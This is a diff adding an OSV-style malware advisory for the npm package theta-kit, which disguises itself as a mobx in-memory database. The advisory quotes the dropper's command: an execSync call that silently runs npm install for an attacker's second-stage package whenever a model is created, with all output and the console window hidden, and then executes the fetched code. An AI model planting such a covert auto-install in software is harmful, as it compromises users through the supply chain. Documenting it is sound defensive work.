@@ -1,0 +1,58 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-4779",
+  "aliases": [
+    "MAL-2026-5706"
+  ],
+  "modified": "2026-06-12T16:12:15Z",
+  "published": "2026-06-12T16:11:04Z",
+  "summary": "Malicious code in theta-kit (npm)",
+  "details": "Disguised as a mobx-backed in-memory database, the package is a stealth dropper for an attacker-controlled second-stage package named theta-connector. Its Model.resetor() routine (in dist/index.js) is invoked automatically from the Model constructor on any model instantiation: it tries to require('theta-connector') and, if absent, silently runs execSync('npm install theta-connector --no-warnings --no-save --no-progress --loglevel silent', {windowsHide:true}) to fetch it, then immediately requires it and calls db.queryDBConnect(), executing the downloaded code. This is remote code download-and-execute via a covert npm install with all output and the Windows console window suppressed; the actual payload lives in the separately-published theta-connector. child_process is declared as a direct dependency to enable execSync.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "theta-kit",
+        "purl": "pkg:npm/theta-kit@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/theta-kit/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-4779"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-12T16:11:04Z",
+      "indicators_observed": {}
+    }
+  }
+}
